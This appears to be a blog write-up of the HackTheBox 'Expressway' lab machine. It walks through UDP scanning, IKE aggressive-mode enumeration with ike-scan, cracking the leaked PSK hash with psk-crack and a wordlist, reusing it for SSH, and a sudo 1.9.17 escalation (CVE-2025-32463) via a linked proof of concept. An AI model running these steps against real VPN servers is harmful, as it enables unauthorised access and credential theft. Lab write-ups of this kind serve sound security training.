---
layout: post
title: Expressway
date: 2026-03-23 20:46 +0100
description: Exploiting an IPsec IKE PSK configuration to gain initial access, then escalating privileges through a sudo vulnerability in Sudo 1.9.17 (CVE-2025-32463).
categories:
- Challenges
- HackTheBox
- Linux
tags:
- hackthebox
- writeups
- linux
- easy
---

![Expressway HackTheBox Writeup](/assets/img/hackthebox/expressway/expressway.png){: width="80" height="80" .right }

## Reconnaissance

We can start by using `nmap` to scan the target for open ports and services:

```bash
nmap -sS -sV -A <target_ip>
```

> This scan checks only TCP ports, and nothing is open. So we switch to a UDP scan:

```bash
nmap -sU <target_ip>
```

We get the following output:

```plaintext
Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-04 09:07 CET
Nmap scan report for 10.10.11.87
Host is up (0.017s latency).
Not shown: 996 closed ports
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

Nmap done: 1 IP address (1 host up) scanned in 1138.88 seconds
```

The port `500` is interesting because it is used for IPsec VPN connections. We can use `ike-scan` to enumerate the VPN server:

```bash
ike-scan -M <target_ip>
```

I used this [cheat sheet](https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html#ikev2-specific-watchguard-vendor-id-version-fingerprinting) to identify the VPN server.
We get this output:

```plaintext
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Main Mode Handshake returned
	HDR=(CKY-R=27da4ce4650b5685)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.773 seconds (1.29 hosts/sec).  1 returned handshake; 0 returned notify
```

This means the target is configured for IPsec and is willing to perform IKE negotiation.

## Exploiting the VPN

We can try to find the fingerprint of the VPN server using `ike-scan` with the `--showbackoff` option:

```bash
ike-scan -M --showbackoff <target_ip>
```

In our case, this does not return anything useful.

Now we can check whether the VPN ID can be brute-forced.

Run this command:

```bash
sudo ike-scan -P -M -A -n fakeID <target_ip>
```

If the server responds with a hash, it means we cannot brute-force the ID directly.
In our case, we get this output:

```plaintext
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned
	HDR=(CKY-R=d4eecdc92ba600e5)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
ad12b8c05fa41260736cc2eb267da084e5839927c01310cebe3ff3ee226434e206456c816efc5b36d5115aae4cceab4bec0d2686189031613e67007ac8006243cae97efe29828d13ca79643c51e25ef60936475028565fb69726d4827e3a87611a6a20eeef816037107d6337a26df10739e65094e8b4236374b7e8215bce7ae3:b8d9731297905ec7fcf2b64fb13f3d4bcf593d78769205b88e980f385043c4625ff9b079d300476b541c65ebd673a44fd9bb6a79a21de8ffd0ac72b77aa7440023ac00196305202c66964dbe1629cdc7e9f2614155bd71e11bb8be891226770277daf556b1c5bb105488158a672dce0982cda8820c1956b4470341c410d6f917:d4eecdc92ba600e5:00d0e5456794b7a1:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:323a4f79fcb8d912dc52d984066887b100b9843d:5d972d5587812adf8f63fee66c17c70e1a4032b04e5124b7c3297b42fcb4557c:6ef1db854597fffc7b5cc084e1560a7098e58207
Ending ike-scan 1.9.5: 1 hosts scanned in 0.079 seconds (12.59 hosts/sec).  1 returned handshake; 0 returned notify
```

So we get the hash and cannot brute-force the ID directly. However, the response reveals the ID: `ike@expressway.htb`.
Now we can try to find the PSK using `psk-crack` from `ike-scan` suite.

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
```

> `hash.txt` contains the hash obtained from the previous command.

After a while, we recover the PSK: `freakingrockstarontheroad`.
Now try SSH with user `ike` and the PSK as the password.

```bash
ssh ike@<target_ip>
```

We are now connected to the server as the `ike` user.

## Privilege Escalation

Now we are on the server as `ike`. We can use `linpeas.sh` to enumerate the system and identify privilege escalation vectors.
`linpeas.sh` shows that `sudo` is available, and we verify its version.

```plaintext
sudo -V
Sudo version 1.9.17
```

This version is vulnerable to a privilege escalation exploit.

[CVE-2025-32463](https://github.com/K1tt3h/CVE-2025-32463-POC).

We then follow the steps in the GitHub PoC to exploit the vulnerability and obtain a root shell.